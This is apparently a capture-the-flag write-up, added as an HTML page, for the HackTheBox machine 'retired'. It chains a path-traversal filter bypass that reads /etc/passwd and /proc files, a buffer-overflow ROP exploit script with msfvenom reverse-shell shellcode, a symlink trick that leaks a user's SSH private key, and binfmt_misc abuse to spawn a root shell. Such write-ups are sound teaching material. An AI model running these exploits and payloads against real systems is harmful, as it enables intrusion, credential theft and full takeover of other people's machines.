@@ -1,0 +1,1446 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>retired | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">retired</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposes a web application with a
+                        vulnerable <code>page</code> parameter that allows arbitrary file reading through path traversal
+                        bypass. By circumventing the sanitization function, I was able to read the source code of PHP
+                        files and discover a binary listening on port 1337 that processes license files.</p>
+
+                    <p>Analyzing the <code>activate_license</code> binary revealed a buffer overflow vulnerability in
+                        the message length handling. Despite NX, PIE, and ASLR protections being enabled, I crafted a
+                        ROP chain using <code>mprotect</code> to make the stack executable, then used a JMP RSP gadget
+                        to execute shellcode, obtaining initial access as <code>www-data</code>.</p>
+
+                    <p>For privilege escalation to the <code>dev</code> user, I exploited a symbolic link vulnerability
+                        in the web backup script that runs periodically. By creating a symlink to
+                        <code>/home/dev/.ssh/id_rsa</code>, I was able to extract the private SSH key from the
+                        generated backup file.
+                    </p>
+
+                    <p>Finally, to escalate to root, I abused the <code>reg_helper</code> binary with the
+                        <code>CAP_DAC_OVERRIDE</code> capability, which allows writing to
+                        <code>/proc/sys/fs/binfmt_misc/register</code>. By registering a custom binary format handler
+                        with the "C" flag (execute with original file permissions), I hijacked the execution of SUID
+                        binaries to spawn a root shell.
+                    </p>
+
+                    <p><strong>Technologies/Exploits:</strong> Path traversal filter bypass, buffer overflow with ROP
+                        chain, <code>mprotect</code> exploitation, symbolic link arbitrary file read, binfmt_misc
+                        registration abuse with CAP_DAC_OVERRIDE.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services on the target:</p>
+                <p><img src="./media/image1.png"
+                        alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals an HTTP server on port 80 and SSH on port 22. The <code>page</code> parameter in
+                    the URL immediately looks suspicious and worth investigating.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>The web application advertises various services:</p>
+                <p><img src="./media/image2.png" alt="Web application homepage showing advertised services" /></p>
+
+                <p>Running whatweb reveals important technology information:</p>
+                <pre><code class="language-bash">whatweb http://10.129.227.96</code></pre>
+
+                <p>The output shows:</p>
+                <pre><code class="language-plaintext">http://10.129.227.96 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.227.96], RedirectLocation[/index.php?page=default.html], nginx
+http://10.129.227.96/index.php?page=default.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[10.129.227.96], PHP, Script, Title[Agency - Start Bootstrap Theme], nginx</code></pre>
+
+                <p>This reveals PHP and nginx as key technologies to keep in mind.</p>
+
+                <h3>Directory Fuzzing</h3>
+                <p>Performing directory fuzzing reveals an interesting page, <code>beta.html</code>:</p>
+                <pre><code class="language-plaintext">css                 (Status: 301) [Size: 162] [--&gt; http://10.129.227.96/css/]
+js                  (Status: 301) [Size: 162] [--&gt; http://10.129.227.96/js/]
+assets              (Status: 301) [Size: 162] [--&gt; http://10.129.227.96/assets/]
+beta.html           (Status: 200) [Size: 4144]
+index.php           (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]
+default.html        (Status: 200) [Size: 11414]</code></pre>
+
+                <p>I can also access this page through the potentially vulnerable <code>page</code> parameter:</p>
+                <pre><code class="language-plaintext">http://10.129.227.96/index.php?page=beta.html</code></pre>
+
+                <p>However, attempting direct path traversal is blocked, suggesting some filtering is in place.</p>
+
+                <h2>File Upload Functionality</h2>
+                <p>The beta page contains interesting file upload functionality:</p>
+                <p><img src="./media/image3.png" alt="Beta page showing file upload form for license activation" /></p>
+
+                <p>Testing the upload with a webshell shows it makes a POST request to
+                    <code>activate_license.php</code>, which returns a blank page with no visible response. Directory
+                    fuzzing doesn't reveal any obvious upload directory where files might be stored.
+                </p>
+
+                <h2>Source Code Discovery</h2>
+                <p>Investigating the <code>page</code> parameter further, I discover that requesting PHP files returns
+                    their source code rather than executing them:</p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=activate_license.php</code></pre>
+
+                <p>This reveals the license processing logic:</p>
+                <pre><code class="language-php">&lt;?php
+if(isset($_FILES['licensefile'])) {
+    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
+    $license_size = $_FILES['licensefile']['size'];
+
+    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+    if (!$socket) { echo "error socket_create()\n"; }
+
+    if (!socket_connect($socket, '127.0.0.1', 1337)) {
+        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
+    }
+
+    socket_write($socket, pack("N", $license_size));
+    socket_write($socket, $license);
+
+    socket_shutdown($socket);
+    socket_close($socket);
+}
+?&gt;</code></pre>
+
+                <p>This reveals a service running on port 1337 that processes these license files.</p>
+
+                <h3>Index.php Source Analysis</h3>
+                <p>Requesting the main index.php source code reveals the sanitization logic:</p>
+                <pre><code class="language-php">&lt;?php
+function sanitize_input($param) {
+    $param1 = str_replace("../","", $param);
+    $param2 = str_replace("./","", $param1);
+    return $param2;
+}
+
+$page = $_GET['page'];
+if (isset($page) &amp;&amp; preg_match("/^[a-z]/", $page)) {
+    $page = sanitize_input($page);
+} else {
+    header('Location: /index.php?page=default.html');
+}
+
+readfile($page);
+?&gt;</code></pre>
+
+                <p>This reveals several important findings:</p>
+                <ul>
+                    <li>It's using <code>readfile()</code> - an arbitrary file read vulnerability, not LFI</li>
+                    <li>The path traversal filter is insecure and can be bypassed</li>
+                    <li>There's an Execute After Redirect (EAR) vulnerability - no <code>die()</code> statement after
+                        the redirect</li>
+                </ul>
+
+                <h2>Path Traversal Filter Bypass</h2>
+                <p>The sanitization function is vulnerable because it performs single-pass replacements. For example,
+                    the string <code>...../</code> becomes:</p>
+
+                <ol>
+                    <li>After <code>str_replace("../","",$param)</code>: <code>..//</code></li>
+                    <li>After <code>str_replace("./","",$param1)</code>: <code>../</code></li>
+                </ol>
+
+                <p>Testing this bypass to read <code>/etc/hostname</code>:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=js/.....///.....///.....///.....///.....///.....///.....///etc/hostname</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-plaintext">retired</code></pre>
+
+                <h3>Execute After Redirect (EAR) Exploitation</h3>
+                <p>Due to the missing <code>die()</code> statement, <code>readfile($page)</code> executes even when the
+                    regex validation fails and a redirect is triggered. With curl, this is straightforward since it
+                    doesn't follow redirects by default:</p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=../../../../../../etc/passwd | grep bash</code></pre>
+
+                <p>This returns user information:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+vagrant:x:1000:1000::/vagrant:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash</code></pre>
+
+                <p>This same technique works with Burp Suite by intercepting and modifying the redirect response.</p>
+
+                <h2>System Reconnaissance via File Read</h2>
+                <p>Reading the nginx configuration reveals the web root:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../etc/nginx/sites-enabled/default</code></pre>
+
+                <pre><code class="language-nginx">server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+
+    root /var/www/html;
+
+    index index.php index.html index.htm;
+
+    server_name _;
+
+    location / {
+        try_files $uri $uri/ =404;
+    }
+
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+    }
+}</code></pre>
+
+                <h3>Discovering Open Ports</h3>
+                <p>Reading <code>/proc/net/tcp</code> reveals the local open TCP ports:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../proc/net/tcp</code></pre>
+
+                <p>The important entry:</p>
+                <pre><code class="language-plaintext">2: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33</code></pre>
+
+                <p>Converting from hexadecimal: <code>0100007F:0539</code> → <code>127.0.0.1:1337</code></p>
+
+                <p>This confirms the service mentioned in <code>activate_license.php</code>.</p>
+
+                <h2>Process Enumeration</h2>
+                <p>I created a bash script to enumerate processes via the <code>/proc/{PID}/cmdline</code> interface:
+                </p>
+
+                <pre><code class="language-bash">#!/bin/bash
+
+TARGET="http://10.129.10.252/index.php?page=../../../../../../.."
+OUTPUT_DIR="lfi_enum"
+mkdir -p "$OUTPUT_DIR"
+
+echo "[*] Starting LFI process enumeration..."
+
+lfi_get() {
+    curl -s "${TARGET}$1" 2&gt;/dev/null
+}
+
+for pid in {1..500}; do
+    cmdline=$(lfi_get "/proc/$pid/cmdline" | tr '\0' ' ' | strings)
+  
+    if [ ! -z "$cmdline" ] &amp;&amp; [ "$cmdline" != "Not Found" ]; then
+        echo "[+] PID $pid: $cmdline"
+        echo "$cmdline" &gt; "$OUTPUT_DIR/pid_${pid}_cmdline.txt"
+      
+        if [[ "$cmdline" == *"python"* ]] || [[ "$cmdline" == *"node"* ]] || [[ "$cmdline" == *"1337"* ]]; then
+            echo "  [!] Interesting process found!"
+          
+            lfi_get "/proc/$pid/exe" &gt; "$OUTPUT_DIR/pid_${pid}_exe"
+            lfi_get "/proc/$pid/environ" | tr '\0' '\n' &gt; "$OUTPUT_DIR/pid_${pid}_environ.txt"
+          
+            cwd=$(lfi_get "/proc/$pid/cwd")
+            echo "  [*] CWD: $cwd"
+        fi
+    fi
+  
+    sleep 0.1
+done
+
+echo "[*] Enumeration complete. Check $OUTPUT_DIR/ for results"</code></pre>
+
+                <p>After some time, the script discovers a process related to port 1337:</p>
+                <pre><code class="language-plaintext">[*] Starting LFI process enumeration...
+[+] PID 418: /usr/bin/activate_license 1337 
+  [!] Interesting process found!
+  [*] CWD: 
+[*] Enumeration complete. Check lfi_enum/ for results</code></pre>
+
+                <p>The binary is located at <code>/usr/bin/activate_license</code>, which I download for analysis.</p>
+
+                <h3>Process Environment Information</h3>
+                <p>Reading the process environment provides additional context:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../proc/418/environ</code></pre>
+
+                <pre><code class="language-plaintext">LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=72de3b3f08b340dea22ca4cea78077ccJOURNAL_STREAM=8:12309</code></pre>
+
+                <h2>Binary Analysis - Buffer Overflow Discovery</h2>
+                <p>Analyzing the binary with Ghidra reveals a critical buffer overflow vulnerability in the message
+                    length handling:</p>
+
+                <pre><code class="language-c">char buffer[512];
+// ...
+msglen = ntohl(msglen);
+read(sockfd, buffer, (ulong)msglen);</code></pre>
+
+                <p>The problem: <code>msglen</code> is read from the network without validation, allowing an attacker to
+                    specify a size larger than the 512-byte buffer.</p>
+
+                <p>The binary also executes SQL operations and saves a <code>license.sqlite</code> file in
+                    <code>/var/www</code>. Downloading and examining it shows:
+                </p>
+
+                <pre><code class="language-sql">sqlite&gt; select * from license;
+1|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>
+
+                <p>This confirms buffer overflow testing has already occurred on the system.</p>
+
+                <h2>Binary Security Analysis</h2>
+                <p>Checking the binary's security protections:</p>
+                <pre><code class="language-bash">checksec --file=activate_license --format=csv</code></pre>
+
+                <pre><code class="language-plaintext">Full RELRO,No Canary found,NX enabled,PIE enabled,No RPATH,No RUNPATH,Symbols,No,0,4,activate_license</code></pre>
+
+                <p>Key findings:</p>
+                <ul>
+                    <li><strong>No Stack Canaries</strong> - Buffer overflow exploitation is possible</li>
+                    <li><strong>NX Enabled</strong> - Cannot execute code directly from the stack</li>
+                    <li><strong>PIE Enabled</strong> - Addresses are randomized</li>
+                    <li><strong>Full RELRO</strong> - GOT/PLT tables are read-only, preventing overwrite attacks</li>
+                </ul>
+
+                <p>These protections require a ROP-based exploitation approach.</p>
+
+                <h3>ASLR Status</h3>
+                <p>Checking if Address Space Layout Randomization is enabled:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../proc/sys/kernel/randomize_va_space</code></pre>
+
+                <pre><code class="language-plaintext">2</code></pre>
+
+                <p>A value of "2" means full ASLR is enabled, randomizing memory positions of libraries, heap, and
+                    stack.</p>
+
+                <h3>Memory Mappings</h3>
+                <p>I retrieve the process memory map to identify library base addresses, which will be crucial for the
+                    ROP chain:</p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=../../../../../../proc/409/maps</code></pre>
+
+                <p>Key memory regions (abbreviated output):</p>
+                <pre><code class="language-plaintext">55d582e6c000-55d582e71000 r-xp /usr/bin/activate_license
+7f31209e2000-7f3120ba3000 r-xp /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f3120ba7000-7f3120cea000 r-xp /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7f3120cf1000-7f3120d1d000 r-xp /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7ffc2a070000-7ffc2a091000 rw-p [stack]</code></pre>
+
+                <h2>Exploitation Strategy - mprotect ROP Chain</h2>
+                <p>Since NX is enabled, I'll use a ROP chain to call <code>mprotect</code> to make the stack executable,
+                    then jump to shellcode. This approach is faster than building a full <code>execve</code> ROP chain.
+                </p>
+
+                <p>First, I download <code>libc-2.31.so</code> from the target and find the <code>mprotect</code>
+                    offset:</p>
+
+                <pre><code class="language-bash">readelf -s libc-2.31.so | grep ' mprotect'</code></pre>
+
+                <pre><code class="language-plaintext"> 1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 mprotect@@GLIBC_2.2.5</code></pre>
+
+                <h3>Understanding mprotect Parameters</h3>
+                <p>The <code>mprotect</code> function signature:</p>
+                <pre><code class="language-c">int mprotect(void *addr, size_t len, int prot);</code></pre>
+
+                <p>In x86-64 calling convention, these parameters map to:</p>
+                <ul>
+                    <li><strong>RDI</strong> (Register Destination Index) - first argument (address)</li>
+                    <li><strong>RSI</strong> (Register Source Index) - second argument (length)</li>
+                    <li><strong>RDX</strong> (Register Data) - third argument (protection flags)</li>
+                </ul>
+
+                <h3>Finding ROP Gadgets</h3>
+                <p>Using ropper to find gadgets in <code>libc-2.31.so</code>:</p>
+
+                <pre><code class="language-bash">ropper -f libc-2.31.so --search "pop rdi"</code></pre>
+                <pre><code class="language-plaintext">0x0000000000026796: pop rdi; ret;</code></pre>
+
+                <pre><code class="language-bash">ropper -f libc-2.31.so --search "pop rsi"</code></pre>
+                <pre><code class="language-plaintext">0x000000000002890f: pop rsi; ret;</code></pre>
+
+                <pre><code class="language-bash">ropper -f libc-2.31.so --search "pop rdx"</code></pre>
+                <pre><code class="language-plaintext">0x00000000000cb1cd: pop rdx; ret;</code></pre>
+
+                <h3>Finding JMP RSP Gadget</h3>
+                <p>Unfortunately, <code>libc-2.31.so</code> doesn't contain a JMP RSP gadget. I download
+                    <code>libsqlite3.so.0.8.6</code> where this gadget exists:
+                </p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=../../../../../../usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -o libsqlite3.so.0.8.6
+
+ropper -f libsqlite3.so.0.8.6 --search "jmp rsp"</code></pre>
+
+                <pre><code class="language-plaintext">[INFO] File: libsqlite3.so.0.8.6
+0x00000000000d431d: jmp rsp;</code></pre>
+
+                <h3>Base Addresses from Memory Map</h3>
+                <p>Recording the important base addresses from the earlier memory map:</p>
+                <pre><code class="language-plaintext">libsqlite3.so.0.8.6: 0x7f3120ba7000
+libc-2.31.so: 0x7f31209e2000
+Stack start: 0x7ffc2a070000
+Stack end: 0x7ffc2a091000</code></pre>
+
+                <h2>Finding the Offset</h2>
+                <p>I need to determine the exact offset where the buffer overflow occurs. First, I run the binary
+                    locally and attach gdb:</p>
+
+                <pre><code class="language-bash">./activate_license 1337</code></pre>
+
+                <pre><code class="language-bash">gdb -q -p $(pidof activate_license)</code></pre>
+
+                <p>Configure gdb to follow child processes (the binary forks for each connection):</p>
+                <pre><code class="language-gdb">gdb-peda$ set follow-fork-mode child
+gdb-peda$ c</code></pre>
+
+                <p>Using pwntools to generate and send a cyclic pattern:</p>
+                <pre><code class="language-python">from pwn import *
+io = remote('127.0.0.1', 1337)
+pattern = cyclic(600)
+io.send(p32(len(pattern), endian='big'))
+io.send(pattern)
+io.close()</code></pre>
+
+                <p>In gdb, the program crashes at the return instruction:</p>
+                <pre><code class="language-gdb">=&gt; 0x5629eae645c0 &lt;activate_license+643&gt;:    ret
+
+Stopped reason: SIGSEGV</code></pre>
+
+                <p>Checking the stack pointer to find the pattern:</p>
+                <pre><code class="language-gdb">gdb-peda$ x/gx $rsp
+0x7fff69904f38: 0x6661616766616166</code></pre>
+
+                <p>Calculating the offset:</p>
+                <pre><code class="language-python">python3 -c "from pwn import *; print('Offset:', cyclic_find(0x6661616766616166))"</code></pre>
+
+                <pre><code class="language-plaintext">Offset: 520</code></pre>
+
+                <h2>Generating Shellcode</h2>
+                <p>Creating a reverse shell payload with msfvenom:</p>
+                <pre><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.172 LPORT=443 -f py -v sc</code></pre>
+
+                <pre><code class="language-plaintext">Payload size: 74 bytes
+Final size of py file: 376 bytes</code></pre>
+
+                <h2>Complete Exploit Script</h2>
+                <p>With all components ready, I create the final exploit that makes a POST request to
+                    <code>activate_license.php</code>:
+                </p>
+
+                <pre><code class="language-python">#!/usr/bin/env python3
+
+import requests
+import struct
+
+# Base addresses from /proc/PID/maps
+libc_base = 0x7f31209e2000
+libsql_base = 0x7f3120ba7000
+stack_start = 0x7ffc2a070000
+stack_end = 0x7ffc2a091000
+
+TARGET_IP = "10.129.227.96"
+URL = f'http://{TARGET_IP}/activate_license.php'
+
+# Reverse shell shellcode
+sc = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
+sc += b"\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a\x0e\xac"
+sc += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
+sc += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
+sc += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
+sc += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
+sc += b"\x0f\x05"
+
+def p64(num):
+    return struct.pack("&lt;Q", num)
+
+# ROP chain components
+mprotect = p64(libc_base + 0xf8c20)
+pop_rdi  = p64(libc_base + 0x26796)
+pop_rsi  = p64(libc_base + 0x2890f)
+pop_rdx  = p64(libc_base + 0xcb1cd)
+jmp_rsp  = p64(libsql_base + 0xd431d)
+stack_size = stack_end - stack_start
+
+# Build the exploit buffer
+buf  = b'A' * 520                # Fill up to return address
+buf += pop_rdi + p64(stack_start) # RDI = stack address
+buf += pop_rsi + p64(stack_size)  # RSI = stack size
+buf += pop_rdx + p64(7)           # RDX = rwx permissions (7)
+buf += mprotect                   # Call mprotect
+buf += jmp_rsp                    # Jump to stack
+buf += sc                         # Reverse shell shellcode
+
+# Send exploit via license file upload
+resp = requests.post(URL, files={'licensefile': buf})</code></pre>
+
+                <p>Setting up a netcat listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Running the exploit successfully returns a shell as <code>www-data</code>:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.14.172] from (UNKNOWN) [10.129.227.96] 56104
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@retired:/var/www/html$</code></pre>
+
+                <h2>Internal Enumeration</h2>
+                <p>After stabilizing the shell, I begin internal reconnaissance:</p>
+
+                <pre><code class="language-bash">id dev</code></pre>
+                <pre><code class="language-plaintext">uid=1001(dev) gid=1001(dev) groups=1001(dev),33(www-data)</code></pre>
+
+                <p>Looking for files owned by the <code>dev</code> user:</p>
+                <pre><code class="language-bash">find / -user dev 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/var/www/2026-02-02_23-30-09-html.zip
+/var/www/2026-02-02_23-28-09-html.zip
+/var/www/2026-02-02_23-29-09-html.zip
+/home/dev</code></pre>
+
+                <p>Files owned by the <code>dev</code> group:</p>
+                <pre><code class="language-bash">find / -group dev 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/lib/emuemu/reg_helper
+/home/dev</code></pre>
+
+                <p>The backup zip files are interesting. The naming pattern suggests automated backups running every
+                    minute with only 3 kept at a time.</p>
+
+                <h2>Discovering the Backup Script</h2>
+                <p>Searching for the backup script by grepping for the zip filename pattern:</p>
+                <pre><code class="language-bash">grep -r '\-html.zip' / 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"</code></pre>
+
+                <p>Examining the backup script:</p>
+                <pre><code class="language-bash">cat /usr/bin/webbackup</code></pre>
+
+                <pre><code class="language-bash">#!/bin/bash
+set -euf -o pipefail
+
+cd /var/www/
+
+SRC=/var/www/html
+DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+
+/usr/bin/rm --force -- "$DST"
+/usr/bin/zip --recurse-paths "$DST" "$SRC"
+
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
+    | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ "$KEEP" -le 0 ]; then
+            /usr/bin/rm --force -- "$backup"
+        fi
+        KEEP="$((KEEP-1))"
+    done</code></pre>
+
+                <p>Key observations:</p>
+                <ul>
+                    <li>The script is owned by root but creates files as the <code>dev</code> user</li>
+                    <li>It recursively zips <code>/var/www/html</code></li>
+                    <li><code>/var/www/html</code> is world-writable</li>
+                    <li>The script follows symbolic links when creating the archive</li>
+                </ul>
+
+                <h2>Privilege Escalation to dev - Symlink Attack</h2>
+                <p>Since the backup script follows symbolic links and <code>/var/www/html</code> is writable, I can
+                    create a symlink to <code>dev</code>'s SSH private key:</p>
+
+                <pre><code class="language-bash">cd /var/www/html
+ln -s /home/dev/.ssh/id_rsa leaked_key</code></pre>
+
+                <pre><code class="language-bash">ls -la leaked_key</code></pre>
+                <pre><code class="language-plaintext">lrwxrwxrwx 1 www-data www-data 21 Feb  2 23:53 leaked_key -&gt; /home/dev/.ssh/id_rsa</code></pre>
+
+                <p>Monitoring the directory for changes:</p>
+                <pre><code class="language-bash">watch -n 1 ls -la</code></pre>
+
+                <p>After about a minute, the symlink disappears (gets removed by the script). Checking the latest backup
+                    zip file:</p>
+
+                <pre><code class="language-bash">unzip -l /var/www/2026-02-02_23-54-09-html.zip | grep leaked_key</code></pre>
+
+                <p>Extracting and viewing the private key:</p>
+                <pre><code class="language-bash">unzip -p /var/www/2026-02-02_23-54-09-html.zip var/www/html/leaked_key</code></pre>
+
+                <p>I copy the SSH private key to my local machine, set proper permissions, and connect:</p>
+                <pre><code class="language-bash">chmod 600 dev_id_rsa
+ssh -i dev_id_rsa dev@10.129.227.96</code></pre>
+
+                <p>Successfully logged in as <code>dev</code>, I can now retrieve the user flag.</p>
+
+                <h2>Privilege Escalation to Root - binfmt_misc Abuse</h2>
+                <p>In the <code>dev</code> user's home directory, I find an interesting <code>emuemu</code> directory
+                    containing C source files and a Makefile:</p>
+
+                <pre><code class="language-bash">ls -la ~/emuemu</code></pre>
+
+                <p>Examining the critical file <code>reg_helper.c</code>:</p>
+                <pre><code class="language-c">#define _GNU_SOURCE
+
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+    char cmd[512] = { 0 };
+
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
+    if (-1 == fd)
+        perror("open");
+    if (write(fd, cmd, strnlen(cmd, sizeof(cmd))) == -1)
+        perror("write");
+    if (close(fd) == -1)
+        perror("close");
+
+    return 0;
+}</code></pre>
+
+                <p>And the Makefile installation section:</p>
+                <pre><code class="language-makefile">install: $(TARGETS)
+    @echo "[+] Installing program files"
+    install --mode 0755 emuemu /usr/bin/
+    mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
+    install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
+    setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+
+    @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
+    echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
+        | tee /usr/lib/binfmt.d/emuemu.conf \
+        | /usr/lib/emuemu/reg_helper</code></pre>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>Key findings:</p>
+                <ul>
+                    <li><code>reg_helper</code> writes user input directly to
+                        <code>/proc/sys/fs/binfmt_misc/register</code>
+                    </li>
+                    <li>This file allows registering custom binary format handlers with the kernel</li>
+                    <li>The binary has the <code>CAP_DAC_OVERRIDE</code> capability, bypassing file permission checks
+                    </li>
+                    <li>No special privileges (like sudo) are required to use this program</li>
+                </ul>
+
+                <p>From the <code>capabilities(7)</code> man page:</p>
+                <blockquote>
+                    <p><strong>CAP_DAC_OVERRIDE</strong>: Bypass file read, write, and execute permission checks. (DAC
+                        is an abbreviation of "discretionary access control".)</p>
+                </blockquote>
+
+                <h3>binfmt_misc Registration Format</h3>
+                <p>According to the kernel documentation, the registration format is:</p>
+                <pre><code class="language-plaintext">:name:type:offset:magic:mask:interpreter:flags</code></pre>
+
+                <p>Important flags:</p>
+                <ul>
+                    <li><strong>C</strong> - Execute with the credentials of the binary (respects SUID bits)</li>
+                </ul>
+
+                <h2>Exploitation Method 1 - Magic Bytes</h2>
+                <p>I'll register a handler based on magic bytes. First, I extract the magic bytes from a SUID binary
+                    like <code>newgrp</code>:</p>
+
+                <pre><code class="language-bash">cat /usr/bin/newgrp | xxd -p | head -1 | sed 's/\(..\)/\\x\1/g'</code></pre>
+                <pre><code class="language-plaintext">\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x47\x00\x00\x00\x00</code></pre>
+
+                <p>Next, I create a simple C program to spawn a privileged shell:</p>
+                <pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+    char *const paramList[10] = {"/bin/bash", "-p", NULL};
+    const int id = 0;
+    setresuid(id, id, id);
+    execve(paramList[0], paramList, NULL);
+    return 0;
+}</code></pre>
+
+                <p>Compiling the privilege escalation binary:</p>
+                <pre><code class="language-bash">gcc -o /tmp/privesc /tmp/privesc.c</code></pre>
+
+                <p>Registering the custom binary format handler:</p>
+                <pre><code class="language-bash">echo ':pwn:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x47\x00\x00\x00\x00::/tmp/privesc:C' | /usr/lib/emuemu/reg_helper</code></pre>
+
+                <p>Verifying the registration:</p>
+                <pre><code class="language-bash">cat /proc/sys/fs/binfmt_misc/pwn</code></pre>
